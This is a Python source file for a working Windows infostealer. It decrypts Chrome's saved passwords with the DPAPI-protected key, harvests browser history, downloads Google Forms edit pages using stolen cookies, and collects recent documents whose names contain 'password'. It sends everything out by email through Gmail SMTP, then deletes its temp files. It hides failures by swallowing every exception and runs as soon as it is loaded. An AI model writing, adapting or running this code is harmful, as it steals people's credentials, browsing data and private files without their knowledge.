import mimetypes
import time
import smtplib
from email.message import EmailMessage
import win32crypt
from Crypto.Cipher import AES
import shutil
import sqlite3
import urllib.request as urllib2
import csv
import os
import browserhistory as bh
from os import getenv
import urllib.request
import browser_cookie3
from re import search
from base64 import b64decode
from json import loads

# The mail addresses and password
SENDER = ""  # Syntax: <Example.email1@gmail.com>
SENDER_P = ""  # App password here, 16-character code, all lowercase and no space, Syntax: "<totallyyrealpass>"
RECEIVER = ""  # Syntax: <Example.email2@gmail.com>


def clairvoyance_mod():
    """
    Get all the name of the files in the pc
    """
    # Get the current pc username
    user = os.getlogin()
    file_set = set()
    # Requirements for files
    DETECT_TUPLE = (f"C:\\Users\\{user}\\Downloads", f"C:\\Users\\{user}\\Desktop", f"C:\\Users\\{user}\\Documents",
                    f"C:\\Users\\{user}\\Pictures", f"C:\\Users\\{user}\\Videos",
                    f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Recent")
    EXTENSION = (".docx", ".pdf")  # Detect the extension name
    DETECT_KEYWORD = ("password",)  # detect any keywords within the file, make it lowercase.
    days = 20  # How many days since last modified back to search

    # Add the rest of the drives to the tuple
    drives = [chr(x) + ":" for x in range(65, 91) if os.path.exists(chr(x) + ":")]
    drives.remove("C:")
    # add \\
    drives = [x + "\\" for x in drives]
    DETECT_TUPLE += tuple(drives)

    # Get all the files in the pc
    for path in DETECT_TUPLE:
        for root, dirs, files in os.walk(path):
            for file in files:
                if file.endswith(EXTENSION) and (not file.startswith("~$")) and \
                        (any(x in file.lower() for x in DETECT_KEYWORD)):
                    try:
                        # get the last modified time of the file
                        last_modified = os.path.getmtime(os.path.join(root, file))
                        if time.time() - last_modified < days * 24 * 60 * 60:  # check if it's in the last x days
                            file_set.add(os.path.join(root, file))  # add it to the set
                            # Limit the number of files to 99
                            if file_set.__len__() >= 99:
                                break
                    except Exception:  # NOQA
                        pass
    return file_set


def decrypt_chrome_passwords():
    """
    Decrypt the chrome passwords
    """
    CHROME_PATH_LOCAL_STATE = os.path.normpath(
        r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (os.environ['USERPROFILE']))
    CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % (os.environ['USERPROFILE']))

    def get_secret_key():
        try:
            # (1) Get secretkey from chrome local state
            with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
                local_state = f.read()
                local_state = loads(local_state)
            secret_key = b64decode(local_state["os_crypt"]["encrypted_key"])
            # Remove suffix DPAPI
            secret_key = secret_key[5:]
            secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
            return secret_key
        except Exception:  # NOQA
            return None

    def decrypt_payload(cipher, payload):
        return cipher.decrypt(payload)

    def generate_cipher(aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

    def decrypt_password(ciphertext, secret_key):
        try:
            # (3-a) Initialisation vector for AES decryption
            initialisation_vector = ciphertext[3:15]
            # (3-b) Get encrypted password by removing suffix bytes (last 16 bits)
            # Encrypted password is 192 bits
            encrypted_password = ciphertext[15:-16]
            # (4) Build the cipher to decrypt the ciphertext
            cipher = generate_cipher(secret_key, initialisation_vector)
            decrypted_pass = decrypt_payload(cipher, encrypted_password)
            decrypted_pass = decrypted_pass.decode()
            return decrypted_pass
        except Exception:  # NOQA
            return ""

    def get_db_connection(chrome_path_login_db):
        try:
            shutil.copy2(chrome_path_login_db, "Loginvault.db")
            return sqlite3.connect("Loginvault.db")
        except Exception:  # NOQA
            return None

    try:
        # Create Dataframe to store passwords
        with open(f"C:\\temp\\.tempcache2.csv", mode='w', newline='',
                  encoding='utf-8') as decrypt_password_file:
            csv_writer = csv.writer(decrypt_password_file, delimiter=',')
            csv_writer.writerow(["index", "url", "username", "password"])
            # (1) Get secret key
            secr_key = get_secret_key()
            # Search user profile or default folder (this is where the encrypted login password is stored)
            folders = [element for element in os.listdir(CHROME_PATH) if
                       search("^Profile*|^Default$", element) != None]
            for folder in folders:
                # (2) Get ciphertext from sqlite database
                chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data" % (CHROME_PATH, folder))
                conn = get_db_connection(chrome_path_login_db)
                if secr_key and conn:
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for index, login in enumerate(cursor.fetchall()):
                        url = login[0]
                        username = login[1]
                        cipher_text = login[2]
                        if url != "" and username != "" and cipher_text != "":
                            # (3) Filter the initialisation vector & encrypted password from ciphertext
                            # (4) Use AES algorithm to decrypt the password
                            decrypted_password = decrypt_password(cipher_text, secr_key)
                            # (5) Save into CSV
                            csv_writer.writerow([index, url, username, decrypted_password])
                    # Close database connection
                    cursor.close()
                    conn.close()
                    # Delete temp login db
                    os.remove("Loginvault.db")
    except Exception:  # NOQA
        pass


def download_form(url, i):
    try:
        global form_list
        cj = browser_cookie3.chrome()
        opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
        login_html = opener.open(url).read()
        # make a html file and store login_html in it
        with open(f"C:\\temp\\login{i}.html", "wb") as f:
            f.write(login_html)
        # put it on form_list
        form_list.append(f"C:\\temp\\login{i}.html")
    except Exception:  # NOQA
        pass


def get_chrome_history():
    # close chrome if it is open
    try:
        os.system("taskkill /f /im chrome.exe")
    except Exception:  # NOQA
        pass

    # get the history
    try:
        dict_obj = bh.get_browserhistory()

        f = open(getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\History", "rb")
        f.close()
    except Exception:  # NOQA
        pass

    i = 0
    while True:
        try:
            # if it's Google form
            if dict_obj['chrome'][i][0].startswith("https://docs.google.com/forms/") and \
                    dict_obj['chrome'][i][0].endswith("/edit"):
                download_form(dict_obj['chrome'][i][0], i)

                i += 1
            # write to csv file but don't delete the previous data
            with open(f"C:\\temp\\.tempcache.csv", mode='a', newline='',
                      encoding='utf-8') as decrypt_password_file:
                decrypt_password_writer = csv.writer(decrypt_password_file, delimiter=',', quotechar='"',
                                                     quoting=csv.QUOTE_MINIMAL)
                decrypt_password_writer.writerow(dict_obj['chrome'][i])
            i += 1
        except Exception:  # NOQA
            break

    try:
        os.remove(getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\History.txt")
        f.close()
    except Exception:  # NOQA
        pass


def delete_form(form_lst):
    for i in form_lst:
        os.remove(i)


def send_priority(subject, filename):
    msg = EmailMessage()
    msg["Subject"] = f"Priority Report, Date: {time.strftime('%d/%m/%Y')}"
    msg["From"] = SENDER
    msg["To"] = RECEIVER
    msg.set_content(f"{subject} for {os.getlogin()}")

    try:
        # attach the csv file
        with open(filename, "rb") as f:
            if f is None:
                return None

            ctype, encoding = mimetypes.guess_type(filename)
            if ctype is None or encoding is not None:
                ctype = "application/octet-stream"
            maintype, subtype = ctype.split("/", 1)

            file_data = f.read()
            file_name = f.name.split("\\")[-1]
            msg.add_attachment(file_data, maintype=maintype, subtype=subtype, filename=file_name)

        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
            smtp.login(SENDER, SENDER_P)
            smtp.send_message(msg)
            smtp.quit()

        os.remove(filename)
    except Exception:  # NOQA
        pass


def access_and_send(*args):
    """
    Access the files and send it through SMTPlib
    """
    msg = EmailMessage()
    msg["Subject"] = f"File Report, Date: {time.strftime('%d/%m/%Y')}"
    msg["From"] = SENDER
    msg["To"] = RECEIVER
    msg.set_content(f"Report for {time.strftime('%d/%m/%Y')}, desktop name: {os.getlogin()}")

    for i in args:
        for j in i:
            if j is None:
                continue
            try:
                with open(j, "rb") as f:
                    ctype, encoding = mimetypes.guess_type(j)
                    if ctype is None or encoding is not None:
                        ctype = "application/octet-stream"
                    maintype, subtype = ctype.split("/", 1)

                    file_data = f.read()
                    file_name = f.name.split("\\")[-1]
                    msg.add_attachment(file_data, maintype=maintype, subtype=subtype, filename=file_name)

                with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
                    smtp.login(SENDER, SENDER_P)
                    smtp.send_message(msg)
                    smtp.quit()
            except Exception:  # NOQA
                pass


# Do not do __main__
file_list = []
form_list = []
try:
    get_chrome_history()
except Exception:  # NOQA
    pass
try:
    access_and_send(form_list)
except Exception:  # NOQA
    pass
try:
    delete_form(form_list)
except Exception:  # NOQA
    pass
try:
    send_priority("Chrome History", f"C:\\temp\\.tempcache.csv")
except Exception:  # NOQA
    pass

try:
    decrypt_chrome_passwords()
except Exception:  # NOQA
    pass
try:
    send_priority("Chrome Passwords", f"C:\\temp\\.tempcache2.csv")
except Exception:  # NOQA
    pass

try:
    file_list += clairvoyance_mod()
    first_run = False
except Exception:  # NOQA
    pass

try:
    access_and_send(file_list)
except Exception:  # NOQA
    pass
